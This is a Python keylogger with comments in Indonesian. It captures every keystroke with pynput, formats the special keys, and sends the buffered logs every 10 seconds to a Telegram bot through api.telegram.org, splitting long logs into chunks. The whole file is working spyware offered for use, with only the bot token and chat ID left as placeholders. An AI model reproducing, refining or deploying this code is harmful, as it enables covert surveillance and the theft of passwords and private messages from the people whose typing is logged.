from pynput import keyboard
from pynput.keyboard import Key
import time
import threading
import requests

# ================= KONFIGURASI TELEGRAM =================
# Ganti dengan Token Bot dan Chat ID kamu
BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'
TELEGRAM_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
# ========================================================

# Global variables (PERSIS SEPERTI KODE AWAL KAMU)
messages_to_send = []  
channel_ids = {'main': 123, 'spam': 456}  # Placeholder tetap ada
text_buffer = ""  

# Variables for dynamic buffer size (PERSIS SEPERTI KODE AWAL KAMU)
last_key_press_time = time.time()
buffer_size_multiplier = 1.0  

def send_keylogs():
    """Fungsi mengirim ke Telegram dengan fitur Auto-Chunking"""
    global messages_to_send

    try:
        if messages_to_send:
            # Gabungkan semua pesan
            messages_str = '\n'.join(messages_to_send)

            # FITUR PRO: Pecah pesan jika lebih dari 4000 karakter (Limit Telegram)
            MAX_LENGTH = 4000
            chunks = [messages_str[i:i + MAX_LENGTH] for i in range(0, len(messages_str), MAX_LENGTH)]

            for chunk in chunks:
                payload = {
                    'chat_id': CHAT_ID,
                    'text': chunk,
                    'parse_mode': 'Markdown'
                }
                # Kirim ke Telegram API
                response = requests.post(TELEGRAM_URL, data=payload, timeout=10)
                response.raise_for_status()
                time.sleep(0.5) # Jeda anti-spam

            # Kosongkan list setelah berhasil
            messages_to_send = []

    except requests.RequestException as e:
        print(f"Error sending keylogs: {e}")

    # Jadwalkan ulang setiap 10 detik (Sesuai kode awal kamu)
    threading.Timer(10, send_keylogs).start()

def on_press(key):
    global messages_to_send, text_buffer, last_key_press_time, buffer_size_multiplier

    # Logika pembersihan string (Sesuai kode awal kamu)
    processed_key = str(key)[1:-1] if (str(key)[0] == '\'' and str(key)[-1] == '\'') else key

    # Logika Dynamic Buffer Size (Sesuai kode awal kamu)
    time_since_last_press = time.time() - last_key_press_time
    last_key_press_time = time.time()
    buffer_size_multiplier = max(1.0, min(5.0, buffer_size_multiplier + 0.1 * (1.0 - time_since_last_press)))

    # Mapping Keycodes (LENGKAP: Awal + F1-F12 + Navigasi)
    keycodes = {
        Key.space: ' ',
        Key.shift: ' *`[SHIFT]`*',
        Key.tab: ' *`[TAB]`*',
        Key.backspace: ' *`<`*',
        Key.esc: ' *`[ESC]`*',
        Key.caps_lock: ' *`[CAPS]`*',
        Key.enter: ' *`[ENTER]`*\n',
        Key.up: ' *`[↑]`*', Key.down: ' *`[↓]`*',
        Key.left: ' *`[←]`*', Key.right: ' *`[→]`*',
        Key.f1: ' *`[F1]`*', Key.f2: ' *`[F2]`*', Key.f3: ' *`[F3]`*',
        Key.f4: ' *`[F4]`*', Key.f5: ' *`[F5]`*', Key.f6: ' *`[F6]`*',
        Key.f7: ' *`[F7]`*', Key.f8: ' *`[F8]`*', Key.f9: ' *`[F9]`*',
        Key.f10: ' *`[F10]`*', Key.f11: ' *`[F11]`*', Key.f12: ' *`[F12]`*',
    }

    # Filter tombol modifier (Sesuai kode awal kamu)
    ignore_keys = [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]

    if processed_key not in ignore_keys:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]

        if processed_key == Key.enter:
            processed_key = ''
            messages_to_send.append(text_buffer + ' *`[ENTER]`*')
            text_buffer = ''

        text_buffer += str(processed_key)

        # Logika Limit Buffer & Filter Khusus (Sesuai kode awal kamu - 1975 multiplier)
        if len(text_buffer) > int(1975 * buffer_size_multiplier):
            # Fitur deteksi spam 'wwwww' dsb tetap ada
            if 'wwwww' in text_buffer or 'aaaaa' in text_buffer or 'sssss' in text_buffer or 'ddddd' in text_buffer:
                messages_to_send.append(text_buffer)
            else:
                messages_to_send.append(text_buffer)
            text_buffer = ''

# Start Monitoring
print("[-] Sentinel Ultimate: Monitoring Started...")
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Kirim log pertama kali
send_keylogs()

# Tetap berjalan
keyboard_listener.join()
